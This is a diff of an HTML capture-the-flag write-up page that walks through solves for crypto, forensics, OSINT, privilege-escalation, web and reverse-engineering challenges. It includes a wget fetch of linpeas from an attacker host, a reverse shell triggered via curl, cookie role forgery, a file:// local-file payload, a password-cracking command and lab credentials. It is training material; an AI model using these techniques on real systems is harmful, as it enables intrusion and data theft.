@@ -61,17 +61,20 @@
               <li class="solve-step"><h4>Download the supplied file</h4>
                 <p>I downloaded the challenge file first. Its content was a Braille alphabet, so I treated it as an encoding reference rather than trying unrelated cryptography.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/braille-challenge.webp" alt="The Braille challenge and the supplied alphabet." loading="lazy"><figcaption>The Braille challenge and the supplied alphabet.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Recognise the Braille alphabet</h4>
                 <p>The alphabet in the file gave the mapping required to read the dots. This was the key observation that selected the decoder.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/braille-decode.webp" alt="The Braille decoder translates the supplied dot patterns." loading="lazy"><figcaption>The Braille decoder translates the supplied dot patterns.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Decode the dot patterns</h4>
                 <p>I entered the Braille into dCode’s Braille Alphabet decoder and read the resulting flag text. The decoded output matched the expected K0CTF format.</p>
+
 
 
 
@@ -94,11 +97,13 @@
               <li class="solve-step"><h4>Inspect cipher.txt</h4>
                 <p>I downloaded cipher.txt and found an encrypted-looking string. The title “dreizehn” is German for thirteen, which made ROT13 the most direct hypothesis.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/dreizehn-challenge.webp" alt="The dreizehn?? challenge and its cipher text." loading="lazy"><figcaption>The dreizehn?? challenge and its cipher text.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Apply the title clue</h4>
                 <p>I used CyberChef’s ROT13 operation because ROT13 shifts each letter by thirteen positions and directly fits the title clue.</p>
+
                 <p class="code-language">text</p>
                 <pre><code>ROT13</code></pre>
 
@@ -106,6 +111,7 @@
               </li>
               <li class="solve-step"><h4>Read the decoded output</h4>
                 <p>The ROT13 result produced a string in the expected flag format.</p>
+
 
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/dreizehn-decode.webp" alt="CyberChef shows the ROT13-decoded flag text." loading="lazy"><figcaption>CyberChef shows the ROT13-decoded flag text.</figcaption></figure>
 
@@ -133,12 +139,14 @@
               <li class="solve-step"><h4>Download Cat.png</h4>
                 <p>I downloaded Cat.png and first viewed it normally. It appeared to be an ordinary cat image, so the visible pixels alone did not explain the challenge.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/bl3hh-challenge.webp" alt="The Bl3hh challenge prompt." loading="lazy"><figcaption>The Bl3hh challenge prompt.</figcaption></figure>
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/bl3hh-cat.webp" alt="The supplied Cat.png appears normal when opened." loading="lazy"><figcaption>The supplied Cat.png appears normal when opened.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Run a steganography check</h4>
                 <p>Because the challenge supplied a single image, I uploaded it to Aperi’Solve for a deeper steganography analysis instead of guessing from the picture.</p>
+
                 <p class="code-language">text</p>
                 <pre><code>Aperi’Solve → analyse Cat.png</code></pre>
 
@@ -146,6 +154,7 @@
               </li>
               <li class="solve-step"><h4>Inspect zsteg output</h4>
                 <p>Aperi’Solve’s zsteg result contained the flag. This confirmed that the hidden data was in the image encoding rather than the visible cat image.</p>
+
 
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/bl3hh-zsteg.webp" alt="The zsteg result contains the recovered flag." loading="lazy"><figcaption>The zsteg result contains the recovered flag.</figcaption></figure>
 
@@ -168,6 +177,7 @@
               <li class="solve-step"><h4>Open the downloaded JPEG</h4>
                 <p>I downloaded missing_kuru.jpg and found that it was corrupted. Since the task was an image file that would not open, I checked its header before treating it as a steganography problem.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/missing-kuru-challenge.webp" alt="The Missing Kuru challenge prompt." loading="lazy"><figcaption>The Missing Kuru challenge prompt.</figcaption></figure>
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/missing-kuru-header-before.webp" alt="The damaged image header before repair." loading="lazy"><figcaption>The damaged image header before repair.</figcaption></figure>
 
@@ -175,11 +185,13 @@
               <li class="solve-step"><h4>Compare and repair the header</h4>
                 <p>I used HexEd.it to repair the JPEG header. I chose this because a malformed signature is enough to prevent an otherwise valid image from rendering.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/missing-kuru-header-after.webp" alt="The corrected JPEG header in HexEd.it." loading="lazy"><figcaption>The corrected JPEG header in HexEd.it.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Open the repaired image</h4>
                 <p>After saving the corrected file, the image opened and displayed the flag directly.</p>
+
 
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/missing-kuru-result.webp" alt="The repaired image reveals the flag." loading="lazy"><figcaption>The repaired image reveals the flag.</figcaption></figure>
 
@@ -202,12 +214,14 @@
               <li class="solve-step"><h4>Inspect the broken GIF</h4>
                 <p>I downloaded nomorekuru.gif. Like Missing Kuru, it was corrupted, so I began by checking the GIF header rather than attempting to play it.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/no-more-kuru-challenge.webp" alt="The No more kuru challenge prompt." loading="lazy"><figcaption>The No more kuru challenge prompt.</figcaption></figure>
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/no-more-kuru-header.webp" alt="The GIF header that needs repair." loading="lazy"><figcaption>The GIF header that needs repair.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Repair the GIF signature</h4>
                 <p>I used HexEd.it and the GIF file format to correct the header. Restoring the signature made the file readable again.</p>
+
 
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/no-more-kuru-hex.webp" alt="HexEd.it view used while repairing the GIF header." loading="lazy"><figcaption>HexEd.it view used while repairing the GIF header.</figcaption></figure>
 
@@ -217,9 +231,11 @@
 
 
 
+
               </li>
               <li class="solve-step"><h4>Play the repaired animation</h4>
                 <p>The repaired GIF showed Herta spinning and the final text contained the flag. The source records the flag without a K0CTF prefix, so it is preserved exactly as shown.</p>
+
 
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/no-more-kuru-result.webp" alt="The repaired GIF displays the final flag." loading="lazy"><figcaption>The repaired GIF displays the final flag.</figcaption></figure>
 
@@ -247,11 +263,13 @@
               <li class="solve-step"><h4>Inspect secret.zip</h4>
                 <p>I downloaded secret.zip and found it was password-protected. The title translates to a dictionary attack, which made a wordlist attack the appropriate first attempt.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/menyerang-kamus-challenge.webp" alt="The password-protected ZIP challenge." loading="lazy"><figcaption>The password-protected ZIP challenge.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Run John the Ripper</h4>
                 <p>I used John the Ripper with Kali’s rockyou wordlist to recover the ZIP password, then extracted the archive.</p>
+
                 <p class="code-language">bash</p>
                 <pre><code>zip2john secret.zip &gt; secret.hash
 john --wordlist=/usr/share/wordlists/rockyou.txt secret.hash</code></pre>
@@ -260,6 +278,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt secret.hash</code></pre>
               </li>
               <li class="solve-step"><h4>Open flag.pdf</h4>
                 <p>The extracted archive contained flag.pdf. Opening it revealed the flag below the image.</p>
+
 
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/menyerang-kamus-result.webp" alt="The extracted PDF displays the flag." loading="lazy"><figcaption>The extracted PDF displays the flag.</figcaption></figure>
 
@@ -282,6 +301,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt secret.hash</code></pre>
               <li class="solve-step"><h4>Open flag.png and read the hint</h4>
                 <p>I downloaded flag.png and read the hint about someone who eats carrots being able to see it. I first checked the file for hidden data, but the source records no hidden result.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/find-the-cat-challenge.webp" alt="The Find The Cat challenge prompt." loading="lazy"><figcaption>The Find The Cat challenge prompt.</figcaption></figure>
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/find-the-cat-original.webp" alt="The original image that must be examined closely." loading="lazy"><figcaption>The original image that must be examined closely.</figcaption></figure>
 
@@ -291,9 +311,11 @@ john --wordlist=/usr/share/wordlists/rockyou.txt secret.hash</code></pre>
 
 
 
+
               </li>
               <li class="solve-step"><h4>Locate the marked text</h4>
                 <p>At high zoom, the green arrow identifies the position of the flag in the image.</p>
+
 
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/find-the-cat-zoom.webp" alt="The zoomed image shows where to read the flag." loading="lazy"><figcaption>The zoomed image shows where to read the flag.</figcaption></figure>
 
@@ -321,17 +343,20 @@ john --wordlist=/usr/share/wordlists/rockyou.txt secret.hash</code></pre>
               <li class="solve-step"><h4>Use the supplied account name</h4>
                 <p>The challenge information named the Instagram account kira_the_cat_2000 and specified that the flag used the person’s company and full name. I searched that account first.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/digital-detective-challenge.webp" alt="The Digital Detective prompt supplies the account and flag format." loading="lazy"><figcaption>The Digital Detective prompt supplies the account and flag format.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Check the My pages highlight</h4>
                 <p>The normal posts were not useful, so I followed the “My pages” highlight. It pointed to a LinkedIn profile.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/digital-detective-instagram.webp" alt="The Instagram highlight directs the investigation to LinkedIn." loading="lazy"><figcaption>The Instagram highlight directs the investigation to LinkedIn.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Verify the LinkedIn profile</h4>
                 <p>I searched LinkedIn for Kira Yoshikage and used the profile’s employer and person name to fill the requested flag format.</p>
+
 
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/digital-detective-linkedin.webp" alt="The LinkedIn profile provides the company and identity details." loading="lazy"><figcaption>The LinkedIn profile provides the company and identity details.</figcaption></figure>
 
@@ -354,17 +379,20 @@ john --wordlist=/usr/share/wordlists/rockyou.txt secret.hash</code></pre>
               <li class="solve-step"><h4>Inspect the vacation photograph</h4>
                 <p>I started with the supplied photo and used its visual landmarks for a reverse image/location search.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/mystery-vacation-photo-challenge.webp" alt="The Mystery Vacation Photo challenge image." loading="lazy"><figcaption>The Mystery Vacation Photo challenge image.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Identify the location</h4>
                 <p>Google search identified the location as Senbon Torii. This gave a concrete place name to use for the next clue.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/mystery-vacation-photo-search.webp" alt="Search results identify the location as Senbon Torii." loading="lazy"><figcaption>Search results identify the location as Senbon Torii.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Resolve the three-word location</h4>
                 <p>I searched Senbon Torii in what3words and used the returned three-word address as the flag content.</p>
+
 
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/mystery-vacation-photo-map.webp" alt="The what3words result provides the three-word location." loading="lazy"><figcaption>The what3words result provides the three-word location.</figcaption></figure>
 
@@ -392,17 +420,20 @@ john --wordlist=/usr/share/wordlists/rockyou.txt secret.hash</code></pre>
               <li class="solve-step"><h4>Reuse the preceding challenge credentials</h4>
                 <p>The source says the credentials came from the NeonArcade web challenge. I logged in with those CTF credentials to begin the user-level enumeration.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/system-0xff-user-login.webp" alt="The CTF login step for System 0xFF." loading="lazy"><figcaption>The CTF login step for System 0xFF.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Search the accessible files</h4>
                 <p>After trying the available locations, I found media.txt. Its content was interesting enough to treat as an encoded message rather than ordinary system text.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/system-0xff-user-note.webp" alt="media.txt contains the encoded content." loading="lazy"><figcaption>media.txt contains the encoded content.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Decode media.txt</h4>
                 <p>I decoded the recorded content in CyberChef. The output was the user flag.</p>
+
 
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/system-0xff-user-result.webp" alt="CyberChef produces the System 0xFF user flag." loading="lazy"><figcaption>CyberChef produces the System 0xFF user flag.</figcaption></figure>
 
@@ -425,12 +456,14 @@ john --wordlist=/usr/share/wordlists/rockyou.txt secret.hash</code></pre>
               <li class="solve-step"><h4>Run linpeas after user access</h4>
                 <p>With the user shell already established, I ran linpeas to look for local privilege-escalation paths. The enumeration showed a writable script used by root.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/system-0xff-root-challenge.webp" alt="The root-stage challenge context." loading="lazy"><figcaption>The root-stage challenge context.</figcaption></figure>
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/system-0xff-root-linpeas.webp" alt="linpeas identifies the writable cleanup script." loading="lazy"><figcaption>linpeas identifies the writable cleanup script.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Transfer and execute the enumeration tool</h4>
                 <p>The source records transferring linpeas to the target with wget, then running it. This avoids assuming the vulnerability before checking the target configuration.</p>
+
                 <p class="code-language">bash</p>
                 <pre><code>wget &lt;attacker-host&gt;/linpeas.sh
 chmod +x linpeas.sh
@@ -443,9 +476,11 @@ chmod +x linpeas.sh
 
 
 
+
               </li>
               <li class="solve-step"><h4>Wait for the root shell and read the flag</h4>
                 <p>After the cron job ran, the callback landed as root and root.txt produced the final flag.</p>
+
 
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/system-0xff-root-shell.webp" alt="The returned root shell; the local prompt area is removed." loading="lazy"><figcaption>The returned root shell; the local prompt area is removed.</figcaption></figure>
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/system-0xff-root-result.webp" alt="The root flag is read after the cron escalation." loading="lazy"><figcaption>The root flag is read after the cron escalation.</figcaption></figure>
@@ -468,6 +503,7 @@ chmod +x linpeas.sh
               <ol>
               <li class="solve-step"><h4>Scan the target services</h4>
                 <p>I began with service and default-script enumeration. Ports 80 and 8080 were open, indicating two web entry points worth exploring.</p>
+
                 <p class="code-language">bash</p>
                 <pre><code>nmap -sV -sC 10.10.89.7</code></pre>
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/messy-web-user-challenge.webp" alt="The Messy Web user-stage challenge." loading="lazy"><figcaption>The Messy Web user-stage challenge.</figcaption></figure>
@@ -477,6 +513,7 @@ chmod +x linpeas.sh
               <li class="solve-step"><h4>Follow the discovered endpoints</h4>
                 <p>The scan revealed /host-manage and /manager. I opened them because the source path is driven by exposed management interfaces.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/messy-web-user-host-manage.webp" alt="The host-manage endpoint." loading="lazy"><figcaption>The host-manage endpoint.</figcaption></figure>
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/messy-web-user-manager.webp" alt="The Tomcat manager login interface." loading="lazy"><figcaption>The Tomcat manager login interface.</figcaption></figure>
 
@@ -484,11 +521,13 @@ chmod +x linpeas.sh
               <li class="solve-step"><h4>Use the Tomcat credentials</h4>
                 <p>Cancelling the manager prompt redirected to a page that disclosed tomcat:s3cret. I used those CTF credentials on /manager and inspected the resulting page source.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/messy-web-user-enum.webp" alt="The Tomcat credentials and endpoint trail." loading="lazy"><figcaption>The Tomcat credentials and endpoint trail.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Pivot from ImageApp to SSH</h4>
                 <p>The source code exposed /ImageApp. Its response led to the CTF SSH credentials har:izcbs1, which I used to obtain a limited shell.</p>
+
 
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/messy-web-user-imageapp.webp" alt="The ImageApp endpoint exposes the next lead." loading="lazy"><figcaption>The ImageApp endpoint exposes the next lead.</figcaption></figure>
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/messy-web-user-credential.webp" alt="The recorded credential clue." loading="lazy"><figcaption>The recorded credential clue.</figcaption></figure>
@@ -498,11 +537,13 @@ chmod +x linpeas.sh
               <li class="solve-step"><h4>Validate write access to the web root</h4>
                 <p>The limited account could not do much directly, so I enumerated it and found Apache ran as itmanager while /var/www/html was writable. I first tested execution with a simple shell.php file.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/messy-web-user-shell.webp" alt="A simple PHP shell validates web-root execution." loading="lazy"><figcaption>A simple PHP shell validates web-root execution.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Execute the reverse shell</h4>
                 <p>After the test succeeded, I placed the reverse shell in the web directory and requested it with curl. The callback ran as itmanager and exposed the user flag.</p>
+
 
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/messy-web-user-result.webp" alt="The user-stage shell returns the flag." loading="lazy"><figcaption>The user-stage shell returns the flag.</figcaption></figure>
 
@@ -525,12 +566,14 @@ chmod +x linpeas.sh
               <li class="solve-step"><h4>Stabilise the shell</h4>
                 <p>I started from the itmanager shell obtained in the user stage and stabilised it before attempting escalation.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/messy-web-root-challenge.webp" alt="The root-stage challenge context." loading="lazy"><figcaption>The root-stage challenge context.</figcaption></figure>
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/messy-web-root-shell.webp" alt="The stabilised shell; the local prompt is removed." loading="lazy"><figcaption>The stabilised shell; the local prompt is removed.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Check available sudo rights</h4>
                 <p>Because wget was not available on the target, I used sudo -l to look for an immediately usable root capability. It showed tar could be run as root without a password.</p>
+
                 <p class="code-language">bash</p>
                 <pre><code>sudo -l</code></pre>
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/messy-web-root-sudo.webp" alt="sudo -l shows that tar is permitted as root." loading="lazy"><figcaption>sudo -l shows that tar is permitted as root.</figcaption></figure>
@@ -541,9 +584,11 @@ chmod +x linpeas.sh
 
 
 
+
               </li>
               <li class="solve-step"><h4>Read the root flag</h4>
                 <p>The root execution path produced the final Messy Web flag.</p>
+
 
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/messy-web-root-result.webp" alt="The final root-stage output displays the flag." loading="lazy"><figcaption>The final root-stage output displays the flag.</figcaption></figure>
 
@@ -571,11 +616,13 @@ chmod +x linpeas.sh
               <li class="solve-step"><h4>Read the hint and inspect the binary</h4>
                 <p>The hint says “flag strings”, so I downloaded rev101 and treated it as a string-extraction task rather than a decompilation exercise.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/rev101-challenge.webp" alt="The rev101 challenge prompt." loading="lazy"><figcaption>The rev101 challenge prompt.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Search only for the flag prefix</h4>
                 <p>I used strings and filtered for K0CTF. Filtering keeps the output focused on the expected flag format.</p>
+
                 <p class="code-language">bash</p>
                 <pre><code>strings rev101 | grep K0CTF</code></pre>
 
@@ -583,6 +630,7 @@ chmod +x linpeas.sh
               </li>
               <li class="solve-step"><h4>Verify the returned string</h4>
                 <p>The matching string was the flag.</p>
+
 
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/rev101-result.webp" alt="The filtered strings output contains the flag." loading="lazy"><figcaption>The filtered strings output contains the flag.</figcaption></figure>
 
@@ -605,6 +653,7 @@ chmod +x linpeas.sh
               <li class="solve-step"><h4>Open the binary in a decompiler</h4>
                 <p>I downloaded rev102 and uploaded it to Decompiler Explorer (dogbolt) to inspect the C-like output. I was looking for the input comparison logic.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/rev102-challenge.webp" alt="The rev102 challenge prompt." loading="lazy"><figcaption>The rev102 challenge prompt.</figcaption></figure>
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/rev102-decompile.webp" alt="The decompiler output exposes the comparison array." loading="lazy"><figcaption>The decompiler output exposes the comparison array.</figcaption></figure>
 
@@ -614,9 +663,11 @@ chmod +x linpeas.sh
 
 
 
+
               </li>
               <li class="solve-step"><h4>Run the source-faithful recovery script</h4>
                 <p>The included script applies that subtraction to the recorded byte array. It is kept as a downloadable file so the transformation is reproducible.</p>
+
                 <p class="code-language">python</p>
                 <pre><code>print(&quot;&quot;.join(chr(value - 1) for value in encoded_values))</code></pre>
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/rev102-solver-output.webp" alt="The solver output contains the recovered flag." loading="lazy"><figcaption>The solver output contains the recovered flag.</figcaption></figure>
@@ -640,12 +691,14 @@ chmod +x linpeas.sh
               <li class="solve-step"><h4>Identify the executable format</h4>
                 <p>I checked the supplied file with Detect It Easy (DIE). It identified a Python-based packaged executable, which determined the next extraction approach.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/rev103-challenge.webp" alt="The rev103 challenge prompt." loading="lazy"><figcaption>The rev103 challenge prompt.</figcaption></figure>
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/rev103-die.webp" alt="DIE identifies the Python packaging." loading="lazy"><figcaption>DIE identifies the Python packaging.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Extract the packaged files</h4>
                 <p>I used the PyInstaller extractor and selected rev103.pyc as the most relevant recovered file for analysis.</p>
+
                 <p class="code-language">bash</p>
                 <pre><code>python pyinstxtractor.py rev103</code></pre>
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/rev103-extractor.webp" alt="The extractor recovers the Python bytecode." loading="lazy"><figcaption>The extractor recovers the Python bytecode.</figcaption></figure>
@@ -654,11 +707,13 @@ chmod +x linpeas.sh
               <li class="solve-step"><h4>Decompile the bytecode</h4>
                 <p>I decompiled rev103.pyc with PyLingual. The source showed a five-byte key used to seed Python random, then XORed every byte with predictable getrandbits(8) output.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/rev103-decompile.webp" alt="The recovered Python logic reveals the PRNG/XOR transformation." loading="lazy"><figcaption>The recovered Python logic reveals the PRNG/XOR transformation.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Reproduce the transformation</h4>
                 <p>I saved the recovered transformation as a script. It uses the first five bytes as the little-endian seed and XORs the same pseudorandom stream, matching the documented code path.</p>
+
 
 
                 <a class="file-download" href="../assets/writeups/kernel-zero/files/rev103-decrypt.py" download>Download full decryptor (rev103-decrypt.py)<span></span></a>
@@ -681,12 +736,14 @@ chmod +x linpeas.sh
               <li class="solve-step"><h4>Preserve the available source evidence</h4>
                 <p>The original document provides only the final result screenshot and flag for Rev104; it does not include the binary analysis, commands, or solution script.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/rev104-result.webp" alt="The sole Rev104 evidence retained from the source." loading="lazy"><figcaption>The sole Rev104 evidence retained from the source.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Record the missing solve material</h4>
                 <p>TODO: the source provides no commands, decompiler output, binary, or solve script for Rev104—only the final result screenshot and flag.</p>
                 <p>A source note is available below so visitors can see exactly why no script has been published. Providing a made-up script would not be faithful to the original write-up.</p>
+
 
 
                 <a class="file-download" href="../assets/writeups/kernel-zero/files/rev104-source-limitation.txt" download>Download source limitation note (rev104-source-limitation.txt)<span></span></a>
@@ -709,12 +766,14 @@ chmod +x linpeas.sh
               <li class="solve-step"><h4>Check packing with DIE</h4>
                 <p>I first analysed rev105 with DIE. It showed that the binary was UPX-packed, so static analysis needed an unpacked copy.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/rev105-challenge.webp" alt="The rev105 challenge prompt." loading="lazy"><figcaption>The rev105 challenge prompt.</figcaption></figure>
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/rev105-die.webp" alt="DIE identifies the UPX packing." loading="lazy"><figcaption>DIE identifies the UPX packing.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Unpack the executable</h4>
                 <p>I unpacked the file with UPX and checked it again before loading it in Ghidra.</p>
+
                 <p class="code-language">bash</p>
                 <pre><code>upx -d rev105</code></pre>
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/rev105-packed.webp" alt="The unpacked executable is ready for analysis." loading="lazy"><figcaption>The unpacked executable is ready for analysis.</figcaption></figure>
@@ -722,6 +781,7 @@ chmod +x linpeas.sh
               </li>
               <li class="solve-step"><h4>Read the three validation arrays</h4>
                 <p>Ghidra showed a triple validation system over consecutive character pairs. I recorded the sum, byte-truncated product, and XOR arrays from the DAT locations.</p>
+
 
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/rev105-arrays.webp" alt="Ghidra exposes the validation arrays." loading="lazy"><figcaption>Ghidra exposes the validation arrays.</figcaption></figure>
 
@@ -731,10 +791,12 @@ chmod +x linpeas.sh
 
 
 
+
               </li>
               <li class="solve-step"><h4>Run the documented pair solver</h4>
                 <p>The original write-up states the three equations but does not preserve its own script. I added a reusable, source-faithful solver that accepts the sum, low-byte-product, and XOR arrays copied from Ghidra.</p>
                 <p>It searches printable character pairs, chains neighbouring pairs, and checks the wrap-around condition described in the write-up. This makes the stated method reproducible without pretending that the missing original script was recovered.</p>
+
                 <p class="code-language">bash</p>
                 <pre><code>python3 rev105-pair-solver.py &lt;sums&gt; &lt;products&gt; &lt;xors&gt;</code></pre>
 
@@ -763,11 +825,13 @@ chmod +x linpeas.sh
               <li class="solve-step"><h4>Open the initial page</h4>
                 <p>I opened the challenge page and waited for about fifteen seconds, until the music/dance sequence stopped. It then revealed the first endpoint, /lonely.txt.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/lonely-start.webp" alt="The initial Lonely page." loading="lazy"><figcaption>The initial Lonely page.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Read the first endpoint</h4>
                 <p>I opened /lonely.txt. Its text instructed me to append /secret.txt, so I followed that explicit path instead of guessing.</p>
+
 
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/lonely-endpoint-1.webp" alt="lonely.txt reveals the next endpoint." loading="lazy"><figcaption>lonely.txt reveals the next endpoint.</figcaption></figure>
 
@@ -775,12 +839,14 @@ chmod +x linpeas.sh
               <li class="solve-step"><h4>Follow the endpoint chain</h4>
                 <p>The next text file gave another path, /flag.html. I continued following only the paths provided by the previous response.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/lonely-endpoint-2.webp" alt="secret.txt directs the browser to flag.html." loading="lazy"><figcaption>secret.txt directs the browser to flag.html.</figcaption></figure>
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/lonely-endpoint-3.webp" alt="The final endpoint path is shown." loading="lazy"><figcaption>The final endpoint path is shown.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Read the final page</h4>
                 <p>The final page displayed the flag.</p>
+
 
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/lonely-flag-page.webp" alt="flag.html displays the Lonely flag." loading="lazy"><figcaption>flag.html displays the Lonely flag.</figcaption></figure>
 
@@ -803,12 +869,14 @@ chmod +x linpeas.sh
               <li class="solve-step"><h4>Read the role-change prompt</h4>
                 <p>The website states that the current role is user and asks whether it can be changed to admin. I treated that as a client-controlled role value to test.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/biskut-challenge.webp" alt="The Biskut challenge entry." loading="lazy"><figcaption>The Biskut challenge entry.</figcaption></figure>
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/biskut-role-prompt.webp" alt="The page asks whether the role can be changed from user to admin." loading="lazy"><figcaption>The page asks whether the role can be changed from user to admin.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Send the documented cookie value</h4>
                 <p>The source screenshot records a curl request with Cookie: user=admin; role=admin. I used that exact documented role manipulation request.</p>
+
                 <p class="code-language">bash</p>
                 <pre><code>curl -H &quot;Cookie: user=admin; role=admin&quot; http://kernel.vuln-by-design.com:8095/</code></pre>
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/biskut-role-change.webp" alt="The recorded curl request returns an admin role and the flag." loading="lazy"><figcaption>The recorded curl request returns an admin role and the flag.</figcaption></figure>
@@ -816,6 +884,7 @@ chmod +x linpeas.sh
               </li>
               <li class="solve-step"><h4>Verify the response</h4>
                 <p>The response identifies the role as admin and contains the final flag.</p>
+
 
 
 
@@ -837,6 +906,7 @@ chmod +x linpeas.sh
               <ol>
               <li class="solve-step"><h4>Use the local-file payload</h4>
                 <p>The original write-up records a single payload for the renderer. I entered file:///app/generator/flag.txt so the renderer would request the local flag file.</p>
+
                 <p class="code-language">text</p>
                 <pre><code>file:///app/generator/flag.txt</code></pre>
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/pdf-renderer-challenge.webp" alt="The PDF Renderer result after entering the documented payload." loading="lazy"><figcaption>The PDF Renderer result after entering the documented payload.</figcaption></figure>
@@ -844,6 +914,7 @@ chmod +x linpeas.sh
               </li>
               <li class="solve-step"><h4>Read the rendered result</h4>
                 <p>The renderer returned the local file content, which was the flag.</p>
+
 
 
 
@@ -871,6 +942,7 @@ chmod +x linpeas.sh
               <li class="solve-step"><h4>Inspect the binary properties</h4>
                 <p>The challenge binary’s vuln function reads 200 bytes into an 80-byte buffer. The source notes no PIE, no stack canaries, and an executable stack, so a function-pointer overwrite is viable.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/call-me-challenge.webp" alt="The Call_me challenge and downloadable binary." loading="lazy"><figcaption>The Call_me challenge and downloadable binary.</figcaption></figure>
 
               </li>
@@ -879,9 +951,11 @@ chmod +x linpeas.sh
 
 
 
+
               </li>
               <li class="solve-step"><h4>Choose the flag function</h4>
